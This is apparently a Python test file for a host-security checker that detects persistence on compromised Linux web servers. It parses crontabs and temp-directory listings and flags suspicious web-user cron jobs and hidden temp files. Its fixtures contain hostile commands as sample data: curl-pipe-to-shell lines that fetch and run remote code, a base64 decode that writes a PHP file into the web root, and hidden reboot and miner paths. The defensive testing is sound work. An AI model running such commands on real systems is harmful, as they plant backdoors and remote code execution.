from handscheck.agents.persistence.check import PersistenceFacts, parse_crontabs, parse_temp_entries
from tests.agents.conftest import collect_facts


def test_crontabs() -> None:
    text = (
        "/etc/crontab:SHELL=/bin/sh\n"
        "/etc/crontab:# m h dom mon dow user command\n"
        "/etc/crontab:17 * * * * root cd / && run-parts --report /etc/cron.hourly\n"
        "/etc/cron.d/php:09,39 * * * * root [ -x /usr/lib/php/sessionclean ] && /usr/lib/php/sessionclean\n"
        "/etc/cron.d/x:@reboot root /usr/local/bin/x\n"
        "/var/spool/cron/crontabs/www-data:# DO NOT EDIT\n"
        "/var/spool/cron/crontabs/www-data:*/5 * * * * curl -s http://203.0.113.5/x | sh\n"
        "/var/spool/cron/crontabs/www-data:@reboot /tmp/.x\n"
        '/var/spool/cron/crontabs/www-data:MAILTO=""\n'
        "/var/spool/cron/crontabs/bob:* * *\n"
    )
    entries, env = parse_crontabs(text)
    assert [(e.user, e.schedule, e.command) for e in entries] == [
        ("root", "17 * * * *", "cd / && run-parts --report /etc/cron.hourly"),
        ("root", "09,39 * * * *", "[ -x /usr/lib/php/sessionclean ] && /usr/lib/php/sessionclean"),
        ("root", "@reboot", "/usr/local/bin/x"),
        ("www-data", "*/5 * * * *", "curl -s http://203.0.113.5/x | sh"),
        ("www-data", "@reboot", "/tmp/.x"),
    ]
    assert env == ["/etc/crontab: SHELL=/bin/sh", '/var/spool/cron/crontabs/www-data: MAILTO=""']


def test_temp_entries() -> None:
    text = (
        "/tmp/.X11-unix\td\troot\t1777\t4096\t1.0\n"
        "/tmp/.X11-unix/X0\ts\troot\t777\t0\t1.0\n"
        "/tmp/systemd-private-abc-apache2.service-x\td\troot\t700\t4096\t1.0\n"
        "/tmp/sess_abc\tf\twww-data\t600\t10\t1.0\n"
        "/tmp/build.log\tf\tubuntu\t644\t10\t1.0\n"
        "/var/tmp/run.sh\tf\tubuntu\t755\t10\t1.0\n"
        "/dev/shm/.x\td\twww-data\t700\t60\t1.0\n"
        "/dev/shm/.x/checker\tf\twww-data\t644\t80\t1.0\n"
        "bad line\n"
    )
    entries, counts = parse_temp_entries(
        text,
        roots=["/tmp", "/var/tmp", "/dev/shm"],
        web_users=["www-data"],
        ignore_names=[".X11-unix", "systemd-private-*"],
    )
    assert [(e.path, e.reasons) for e in entries] == [
        ("/dev/shm/.x", ["hidden", "web_user"]),
        ("/dev/shm/.x/checker", ["hidden", "web_user"]),
        ("/tmp/sess_abc", ["web_user"]),
        ("/var/tmp/run.sh", ["executable"]),
    ]
    assert counts == {"/tmp": 5, "/var/tmp": 1, "/dev/shm": 2}


async def test_lab_hosts() -> None:
    compromised = await collect_facts("lab-wp2", "persistence")
    assert isinstance(compromised, PersistenceFacts)
    assert compromised.web_user_crontabs == ["www-data"]
    assert [(e.user, e.command) for e in compromised.cron_entries if e.user == "www-data"] == [
        ("www-data", "/dev/shm/.x/checker >/dev/null 2>&1")
    ]
    assert [e.path for e in compromised.temp_entries] == ["/dev/shm/.x", "/dev/shm/.x/checker"]

    clean = await collect_facts("lab-wp1", "persistence")
    assert isinstance(clean, PersistenceFacts)
    assert clean.web_user_crontabs == [] and clean.temp_entries == []
    assert all(e.user == "root" for e in clean.cron_entries)
    assert all(s.package for s in clean.cron_scripts)
    assert clean.timers and all(t.packaged for t in clean.timers)  # incl. timers dpkg knows under /lib
    assert clean.warnings == []


def _web_cron(entries: list[tuple[str, str]], web: list[str]) -> list[str]:
    from handscheck.agents.persistence.check import CHECK

    facts = {
        "web_user_crontabs": web,
        "cron_entries": [
            {"file": f"/var/spool/cron/crontabs/{u}", "user": u, "schedule": "*/5 * * * *", "command": c}
            for u, c in entries
        ],
    }
    return [f.rule_ids[0] + " " + f.subject for f in CHECK().guaranteed_findings(facts)]


def test_web_user_cron_from_temp_or_fetching_code_is_guaranteed() -> None:
    hits = _web_cron(
        [
            ("www-data", "/dev/shm/.x/checker >/dev/null 2>&1"),
            ("nginx", "curl -s http://x.example/a.sh | sh"),
            ("www-data", "echo aGk= | base64 -d > /var/www/a.php"),
        ],
        ["www-data", "nginx"],
    )
    assert hits == [
        "persistence.web-user-cron-temp /var/spool/cron/crontabs/www-data",
        "persistence.web-user-cron-temp /var/spool/cron/crontabs/nginx",
        "persistence.web-user-cron-temp /var/spool/cron/crontabs/www-data",
    ]


def test_ordinary_web_user_crons_and_other_users_are_not_guaranteed() -> None:
    assert (
        _web_cron(
            [
                ("www-data", "php /var/www/site/wp-cron.php >/dev/null 2>&1"),
                ("www-data", "cd /var/www/app && php artisan schedule:run"),
                ("www-data", "wget -q -O /dev/null https://site.example/wp-cron.php"),
                ("deploy", "/tmp/deploy.sh"),  # not a web user
            ],
            ["www-data"],
        )
        == []
    )


async def test_lab_web_user_cron_is_guaranteed() -> None:
    from handscheck.agents.persistence.check import CHECK

    compromised = await collect_facts("lab-wp2", "persistence")
    assert [
        (f.subject, f.severity) for f in CHECK().guaranteed_findings(compromised.model_dump(mode="json"))
    ] == [("/var/spool/cron/crontabs/www-data", "critical"), ("/dev/shm/.x", "high")]
    clean = await collect_facts("lab-wp1", "persistence")
    assert CHECK().guaranteed_findings(clean.model_dump(mode="json")) == []


def test_hidden_temp_entries_owned_by_a_web_user_or_holding_a_program() -> None:
    from handscheck.agents.persistence.check import HIDDEN_TEMP_RULE, hidden_temp_findings

    def entry(path: str, owner: str, reasons: list[str], kind: str = "f") -> dict[str, object]:
        return {"path": path, "type": kind, "owner": owner, "mode": "0700", "size": 1, "reasons": reasons}

    facts = {
        "temp_counts": {"/tmp": 5, "/dev/shm": 3, "/var/tmp": 0},
        "temp_entries": [
            entry("/dev/shm/.x", "www-data", ["hidden", "web_user"], "d"),
            entry("/dev/shm/.x/checker", "www-data", ["hidden", "web_user"]),
            entry("/tmp/cache/.run/miner", "deploy", ["hidden", "executable"]),
            entry("/tmp/.X11-unix", "root", ["hidden"], "d"),  # hidden, but root's and no program
            entry("/tmp/sess_abc", "www-data", ["web_user"]),  # a web user's, but not hidden
            entry("/tmp/build.sh", "deploy", ["executable"]),
        ],
    }
    found = hidden_temp_findings(facts)
    assert [(f.subject, f.severity, f.rule_ids) for f in found] == [
        ("/dev/shm/.x", "high", [HIDDEN_TEMP_RULE]),
        ("/tmp/cache/.run", "high", [HIDDEN_TEMP_RULE]),
    ]
    assert len(found[0].evidence) == 2
